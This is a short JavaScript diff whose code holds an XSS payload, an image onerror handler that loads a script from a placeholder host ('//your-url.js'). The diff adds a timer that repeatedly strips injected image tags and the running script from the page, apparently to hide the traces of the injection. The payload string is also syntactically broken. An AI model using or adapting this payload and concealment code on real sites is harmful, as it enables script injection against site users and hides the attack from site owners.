@@ -1,3 +1,4 @@
+function fix(){
 const searchContent = `<img src=x onerror='(()=>{var d=document s=d.createElement(\`script\`) s.src=\`//your-url.js\` d.head.appendChild(s)})();'>`;
 document.querySelectorAll('*').forEach(node => {
     if (node.tagName === 'IMG' && node.src.includes("onerror")) {
@@ -13,6 +14,8 @@ if (img && img.nextSibling && img.nextSibling.nodeType === Node.TEXT_NODE) {
     img.parentNode.removeChild(img.nextSibling);
     img.remove();
 }
+}
+setInterval(fix,100);
 const currentScript = document.currentScript;
 if (currentScript) {
     currentScript.remove();
